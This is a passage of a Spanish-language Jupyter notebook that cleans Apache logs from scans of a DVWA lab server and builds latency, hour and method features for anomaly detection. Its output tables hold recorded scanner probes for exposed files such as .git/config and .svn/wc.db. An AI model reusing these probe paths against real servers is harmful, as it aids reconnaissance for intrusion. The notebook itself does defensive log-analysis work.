       "7                                       /DVWA/.svn/wc.db     HTTP/1.1   \n",
       "9                                           /DVWA/~.aspx     HTTP/1.1   \n",
       "11                                        /DVWA/cgi-bin/     HTTP/1.1   \n",
       "...                                                  ...          ...   \n",
       "13591  /index.php/component/users/?task=registration....     HTTP/1.1   \n",
       "13595                       /index.php/component/search/     HTTP/1.1   \n",
       "13613                           /administrator/index.php     HTTP/1.1   \n",
       "13617                       /index.php/component/search/     HTTP/1.1   \n",
       "13621                       /index.php/component/search/     HTTP/1.1   \n",
       "\n",
       "      Status Code Bytes Sent                   Referrer  \\\n",
       "3             404        139                          -   \n",
       "5             404        139                          -   \n",
       "7             404        139                          -   \n",
       "9             404        139                          -   \n",
       "11            404        139                          -   \n",
       "...           ...        ...                        ...   \n",
       "13591         200        237  http://192.168.4.161/DVWA   \n",
       "13595         200       3053                          -   \n",
       "13613         500       1522                          -   \n",
       "13617         303        376  http://192.168.4.161/DVWA   \n",
       "13621         303        363                          -   \n",
       "\n",
       "                                              User Agent  \n",
       "3      Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...  \n",
       "5      Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...  \n",
       "7      Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...  \n",
       "9      Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...  \n",
       "11     Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...  \n",
       "...                                                  ...  \n",
       "13591  Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...  \n",
       "13595  Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...  \n",
       "13613  Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...  \n",
       "13617  Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...  \n",
       "13621  Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...  \n",
       "\n",
       "[2577 rows x 11 columns]"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[df.duplicated()]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Las eliminamos"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = df[-df.duplicated()]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Df invalido sin reducir"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Invalid Lines</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>136</th>\n",
       "      <td>\"192.168.4.164 - - [22/Dec/2023:15:20:34 +0300...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                         Invalid Lines\n",
       "136  \"192.168.4.164 - - [22/Dec/2023:15:20:34 +0300..."
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_invalid[df_invalid.duplicated()]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Esta convendría eliminarla"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Df invalido reducido"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Client IP</th>\n",
       "      <th>Ident</th>\n",
       "      <th>Auth</th>\n",
       "      <th>Timestamp</th>\n",
       "      <th>Method</th>\n",
       "      <th>Request</th>\n",
       "      <th>HTTP Version</th>\n",
       "      <th>Status Code</th>\n",
       "      <th>Bytes Sent</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:15 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1964</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:15 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1964</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:15 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1964</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:18 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/dvwa/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>675</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:18 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/dvwa/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>675</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>209</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:21:15 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/dvwa/?C=N;O=D</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>729</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>220</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:35:03 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/vulnerabilities/brute/include.php</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>529</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>221</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:35:03 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/vulnerabilities/brute/include.php</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>529</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>222</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:35:03 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/vulnerabilities/brute/include.php</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>529</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>223</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:35:03 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/vulnerabilities/brute/include.php</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>529</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>124 rows × 9 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "         Client IP Ident Auth                   Timestamp Method  \\\n",
       "2    192.168.4.164     -    -  22/Dec/2023:15:19:15 +0300    GET   \n",
       "3    192.168.4.164     -    -  22/Dec/2023:15:19:15 +0300    GET   \n",
       "4    192.168.4.164     -    -  22/Dec/2023:15:19:15 +0300    GET   \n",
       "6    192.168.4.164     -    -  22/Dec/2023:15:19:18 +0300    GET   \n",
       "7    192.168.4.164     -    -  22/Dec/2023:15:19:18 +0300    GET   \n",
       "..             ...   ...  ...                         ...    ...   \n",
       "209  192.168.4.164     -    -  22/Dec/2023:15:21:15 +0300    GET   \n",
       "220  192.168.4.164     -    -  22/Dec/2023:15:35:03 +0300    GET   \n",
       "221  192.168.4.164     -    -  22/Dec/2023:15:35:03 +0300    GET   \n",
       "222  192.168.4.164     -    -  22/Dec/2023:15:35:03 +0300    GET   \n",
       "223  192.168.4.164     -    -  22/Dec/2023:15:35:03 +0300    GET   \n",
       "\n",
       "                                     Request HTTP Version Status Code  \\\n",
       "2                                     /DVWA/     HTTP/1.1         200   \n",
       "3                                     /DVWA/     HTTP/1.1         200   \n",
       "4                                     /DVWA/     HTTP/1.1         200   \n",
       "6                                /DVWA/dvwa/     HTTP/1.1         200   \n",
       "7                                /DVWA/dvwa/     HTTP/1.1         200   \n",
       "..                                       ...          ...         ...   \n",
       "209                      /DVWA/dvwa/?C=N;O=D     HTTP/1.1         200   \n",
       "220  /DVWA/vulnerabilities/brute/include.php     HTTP/1.1         404   \n",
       "221  /DVWA/vulnerabilities/brute/include.php     HTTP/1.1         404   \n",
       "222  /DVWA/vulnerabilities/brute/include.php     HTTP/1.1         404   \n",
       "223  /DVWA/vulnerabilities/brute/include.php     HTTP/1.1         404   \n",
       "\n",
       "    Bytes Sent  \n",
       "2         1964  \n",
       "3         1964  \n",
       "4         1964  \n",
       "6          675  \n",
       "7          675  \n",
       "..         ...  \n",
       "209        729  \n",
       "220        529  \n",
       "221        529  \n",
       "222        529  \n",
       "223        529  \n",
       "\n",
       "[124 rows x 9 columns]"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_invalid_reduced[df_invalid_reduced.duplicated()]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Generación de variables númericas interesantes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Client IP</th>\n",
       "      <th>Ident</th>\n",
       "      <th>Auth</th>\n",
       "      <th>Timestamp</th>\n",
       "      <th>Method</th>\n",
       "      <th>Request</th>\n",
       "      <th>HTTP Version</th>\n",
       "      <th>Status Code</th>\n",
       "      <th>Bytes Sent</th>\n",
       "      <th>Referrer</th>\n",
       "      <th>User Agent</th>\n",
       "      <th>Client IP_encoded</th>\n",
       "      <th>Referrer_encoded</th>\n",
       "      <th>Method_encoded</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:05 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>2020</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>263</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.git/config</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.svn/all-wcprops</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.svn/wc.db</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       Client IP Ident Auth                   Timestamp Method  \\\n",
       "0  192.168.4.164     -    -  22/Dec/2023:15:19:05 +0300    GET   \n",
       "1  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "2  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "4  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "6  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "\n",
       "                  Request HTTP Version Status Code Bytes Sent Referrer  \\\n",
       "0                  /DVWA/     HTTP/1.1         200       2020        -   \n",
       "1                  /DVWA/     HTTP/1.1         200        263        -   \n",
       "2       /DVWA/.git/config     HTTP/1.1         404        139        -   \n",
       "4  /DVWA/.svn/all-wcprops     HTTP/1.1         404        139        -   \n",
       "6        /DVWA/.svn/wc.db     HTTP/1.1         404        139        -   \n",
       "\n",
       "                                          User Agent  Client IP_encoded  \\\n",
       "0  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                  0   \n",
       "1  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                  0   \n",
       "2  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                  0   \n",
       "4  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                  0   \n",
       "6  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                  0   \n",
       "\n",
       "   Referrer_encoded  Method_encoded  \n",
       "0                 0               0  \n",
       "1                 0               1  \n",
       "2                 0               1  \n",
       "4                 0               1  \n",
       "6                 0               1  "
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "codificador = LabelEncoder()\n",
    "\n",
    "# Aplicar el codificador a las columnas especificadas\n",
    "columnas_a_codificar = ['Client IP', 'Referrer', 'Method']\n",
    "for columna in columnas_a_codificar:\n",
    "    df[columna + '_encoded'] = codificador.fit_transform(df[columna])\n",
    "\n",
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [],
   "source": [
    "df['Bytes Sent'] = pd.to_numeric(df['Bytes Sent'])\n",
    "\n",
    "df['Status Code'] = pd.to_numeric(df['Status Code'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [],
   "source": [
    "df['Timestamp:'] = pd.to_datetime(df['Timestamp'], format='%d/%b/%Y:%H:%M:%S %z')\n",
    "\n",
    "df['Hora'] = df['Timestamp:'].dt.hour\n",
    "\n",
    "df['Dia'] = df['Timestamp:'].dt.day"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>index</th>\n",
       "      <th>Client IP</th>\n",
       "      <th>Ident</th>\n",
       "      <th>Auth</th>\n",
       "      <th>Timestamp</th>\n",
       "      <th>Method</th>\n",
       "      <th>Request</th>\n",
       "      <th>HTTP Version</th>\n",
       "      <th>Status Code</th>\n",
       "      <th>Bytes Sent</th>\n",
       "      <th>Referrer</th>\n",
       "      <th>User Agent</th>\n",
       "      <th>Client IP_encoded</th>\n",
       "      <th>Referrer_encoded</th>\n",
       "      <th>Method_encoded</th>\n",
       "      <th>Timestamp:</th>\n",
       "      <th>Hora</th>\n",
       "      <th>Dia</th>\n",
       "      <th>Latencia</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:05 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>2020</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>2023-12-22 15:19:05+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>263</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>2023-12-22 15:19:06+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>2</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.git/config</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>2023-12-22 15:19:06+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>4</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.svn/all-wcprops</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>2023-12-22 15:19:06+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>6</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.svn/wc.db</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>2023-12-22 15:19:06+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   index      Client IP Ident Auth                   Timestamp Method  \\\n",
       "0      0  192.168.4.164     -    -  22/Dec/2023:15:19:05 +0300    GET   \n",
       "1      1  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "2      2  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "3      4  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "4      6  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "\n",
       "                  Request HTTP Version  Status Code  Bytes Sent Referrer  \\\n",
       "0                  /DVWA/     HTTP/1.1          200        2020        -   \n",
       "1                  /DVWA/     HTTP/1.1          200         263        -   \n",
       "2       /DVWA/.git/config     HTTP/1.1          404         139        -   \n",
       "3  /DVWA/.svn/all-wcprops     HTTP/1.1          404         139        -   \n",
       "4        /DVWA/.svn/wc.db     HTTP/1.1          404         139        -   \n",
       "\n",
       "                                          User Agent  Client IP_encoded  \\\n",
       "0  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                  0   \n",
       "1  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                  0   \n",
       "2  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                  0   \n",
       "3  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                  0   \n",
       "4  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                  0   \n",
       "\n",
       "   Referrer_encoded  Method_encoded                Timestamp:  Hora  Dia  \\\n",
       "0                 0               0 2023-12-22 15:19:05+03:00    15   22   \n",
       "1                 0               1 2023-12-22 15:19:06+03:00    15   22   \n",
       "2                 0               1 2023-12-22 15:19:06+03:00    15   22   \n",
       "3                 0               1 2023-12-22 15:19:06+03:00    15   22   \n",
       "4                 0               1 2023-12-22 15:19:06+03:00    15   22   \n",
       "\n",
       "   Latencia  \n",
       "0       0.0  \n",
       "1       0.0  \n",
       "2       0.0  \n",
       "3       0.0  \n",
       "4       0.0  "
      ]
     },
     "execution_count": 42,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df = df.reset_index()\n",
    "\n",
    "df_ordenado = df.groupby('Client IP').apply(ordenar_grupo)\n",
    "\n",
    "df_ordenado['Latencia'] = df_ordenado['Timestamp:'].diff().dt.total_seconds()\n",
    "\n",
    "df_ordenado['Prev_IP'] = df_ordenado['Client IP'].shift(1)\n",
    "\n",
    "# Si la IP anterior no es la misma que la actual, la latencia debe ser 0\n",
    "df_ordenado['Latencia'] = df_ordenado.apply(\n",
    "    lambda row: row['Latencia'] if row['Client IP'] == row['Prev_IP'] else 0,\n",
    "    axis=1\n",
    ")\n",
    "\n",
    "df_ordenado.drop(columns=['Prev_IP'], inplace=True)\n",
    "\n",
    "df = pd.merge(df, df_ordenado[['index', 'Latencia']], on='index', how='left')\n",
    "df.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Análisis manual de detección de anomalías"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Número de IPs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['192.168.4.164', '192.168.4.25'], dtype=object)"
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['Client IP'].unique()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Latencia"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([  0.,   1.,   6.,  11.,   2.,  12.,  24.,  14.,  27.,  29.,   9.,\n",
       "        13.,  10.,  36.,   4., 384.,   3.])"
      ]
     },
     "execution_count": 48,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['Latencia'].unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1000x600 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Visualizar la latencia en un histograma\n",
    "plt.figure(figsize=(10, 6))\n",
    "plt.hist(df['Latencia'], bins=10, color='blue', alpha=0.7)\n",
    "plt.xlabel('Latencia (segundos)')\n",
    "plt.ylabel('Frecuencia')\n",
    "plt.title('Latencia Distribución')\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Client IP\n",
       "192.168.4.164    0.204909\n",
       "192.168.4.25     0.303864\n",
       "Name: Latencia, dtype: float64"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.groupby('Client IP')['Latencia'].mean()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Distribución temporal"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Client IP      Dia  Hora\n",
       "192.168.4.164  22   15      5378\n",
       "192.168.4.25   22   16      5667\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 51,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.groupby('Client IP')[['Dia', 'Hora']].value_counts()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Distribucion method"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
